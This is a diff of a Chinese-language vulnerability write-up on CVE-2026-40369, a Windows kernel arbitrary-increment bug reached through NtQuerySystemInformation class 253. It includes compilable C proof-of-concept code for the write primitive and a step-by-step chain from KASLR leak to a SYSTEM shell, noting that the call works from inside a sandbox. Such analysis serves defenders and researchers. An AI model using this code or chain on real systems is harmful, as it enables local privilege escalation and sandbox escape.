@@ -51,7 +51,7 @@ NtQuerySystemInformation 有很多信息类别（info class），其中 class 25
   
 关键问题出在这个函数的第 253 类处理路径上：  
 ```
-// ExpGetProcessInformation 简化逻辑v95 = buffer;  // buffer 是攻击者控制的内核地址（因为 Length=0 绕过了检查）while (NextProcess) {    if (infoClass == 253) {        ++*v95;         // 在攻击者指定的内核地址上做 +1 操作        v95[1] += ...;  // 在地址+4 处累加线程数        v95[2] += ...;  // 在地址+8 处累加句柄数    }}
+// ExpGetProcessInformation 简化逻辑v95 = buffer;  // buffer 是攻击者控制的内核地址（因为 Length=0 绕过了检查）while (NextProcess) {    if (infoClass == 253) {        ++*v95;         // 在攻击者指定的内核地址上做 +1 操作        v95[1] += ...;  // 在地址+4 处累加线程数        v95[2] += ...;  // 在地址+8 处累加句柄数    }}
 ```  
   
 也就是说：**只要调用一次这个系统调用，系统里每存在一个进程，就会在你指定的内核地址上执行一次写操作**  
@@ -64,7 +64,7 @@ NtQuerySystemInformation 有很多信息类别（info class），其中 class 25
 。  
   
 具体来说：  
-- Chrome 沙箱的 win32k lockdown **不阻止这个 syscall**  
+- Chrome 沙箱的 win32k lockdown **不阻止这个 syscall**  
   
 - 受限令牌（restricted token）**不阻止这个 syscall**  
   
@@ -79,9 +79,9 @@ NtQuerySystemInformation 有很多信息类别（info class），其中 class 25
 内核地址每次启动都是随机的，攻击者不知道把"递增写入"送到哪里才能实现提权。好消息是，GitHub 上的公开 PoC 本身附带了一个 KASLR 泄露模块，利用 prefetch-tool 工具可以从用户态获取内核模块基址——加上这次漏洞的任意写入，就能组合成一条完整的提权链：  
   
 **第一步**  
-：用 KASLR 泄露获取 ntoskrnl.exe 的基址 **第二步**  
-：定位内核 Token 对象（存储进程权限信息的数据结构） **第三步**  
-：通过 CVE-2026-40369 的递增写入原语，将当前进程的 Token 权限位设置为 SYSTEM **第四步**  
+：用 KASLR 泄露获取 ntoskrnl.exe 的基址 **第二步**  
+：定位内核 Token 对象（存储进程权限信息的数据结构） **第三步**  
+：通过 CVE-2026-40369 的递增写入原语，将当前进程的 Token 权限位设置为 SYSTEM **第四步**  
 ：此时当前进程已拥有 SYSTEM 权限，启动一个 SYSTEM 级别的 cmd.exe，完成提权  
   
 PoC 代码100%确定性稳定触发，不是"可能可以"而是"一定可以"。  
@@ -110,7 +110,7 @@ PoC 代码100%确定性稳定触发，不是"可能可以"而是"一定可以"�
   
 以下代码来自 GitHub 公开仓库 orinimron123/CVE-2026-40369-EXPLOIT，演示了漏洞的核心原语——任意内核地址递增写入。  
 ```
-#include <windows.h>#include <stdio.h>#pragma comment(lib, "ntdll.lib")typedeflong NTSTATUS;#define SystemProcessInformationExtension 253typedefNTSTATUS(NTAPI *PNtQuerySystemInformation)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);intmain(void){    PNtQuerySystemInformation pNtQSI = (PNtQuerySystemInformation)        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");    // 任意内核地址：攻击者可替换为真实内核对象地址    PVOID target = (PVOID)0xffff800041424344ULL;    printf("[*] NtQuerySystemInformation class 253 arbitrary kernel increment PoC\n");    printf("[*] Target kernel address: %p\n", target);    printf("[*] Will write:\n");    printf("     [target+0] += num_processes (DWORD increment)\n");    printf("     [target+4] += total_threads (DWORD add)\n");    printf("     [target+8] += total_handles (DWORD add)\n");    printf("\n[!] This WILL bugcheck if the address is not mapped writable memory.\n");    printf("[*] Press Enter to trigger...\n");    getchar();    ULONG needed = 0;    NTSTATUS status = pNtQSI(        SystemProcessInformationExtension,        target,   // 内核地址 —— 因为 Length=0，ProbeForWrite 完全被绕过        0,        // Length=0 是绕过关键        &needed    );    printf("[*] NtQuerySystemInformation returned: 0x%08lX\n", status);    printf("[*] Required length: %lu\n", needed);    printf("[+] Done. If you see this, the writes succeeded without bugcheck.\n");    return0;}
+#include <windows.h>#include <stdio.h>#pragma comment(lib, "ntdll.lib")typedeflong NTSTATUS;#define SystemProcessInformationExtension 253typedefNTSTATUS(NTAPI *PNtQuerySystemInformation)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);intmain(void){    PNtQuerySystemInformation pNtQSI = (PNtQuerySystemInformation)        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");    // 任意内核地址：攻击者可替换为真实内核对象地址    PVOID target = (PVOID)0xffff800041424344ULL;    printf("[*] NtQuerySystemInformation class 253 arbitrary kernel increment PoC\n");    printf("[*] Target kernel address: %p\n", target);    printf("[*] Will write:\n");    printf("     [target+0] += num_processes (DWORD increment)\n");    printf("     [target+4] += total_threads (DWORD add)\n");    printf("     [target+8] += total_handles (DWORD add)\n");    printf("\n[!] This WILL bugcheck if the address is not mapped writable memory.\n");    printf("[*] Press Enter to trigger...\n");    getchar();    ULONG needed = 0;    NTSTATUS status = pNtQSI(        SystemProcessInformationExtension,        target,   // 内核地址 —— 因为 Length=0，ProbeForWrite 完全被绕过        0,        // Length=0 是绕过关键        &needed    );    printf("[*] NtQuerySystemInformation returned: 0x%08lX\n", status);    printf("[*] Required length: %lu\n", needed);    printf("[+] Done. If you see this, the writes succeeded without bugcheck.\n");    return0;}
 ```  
   
 **编译方式**  
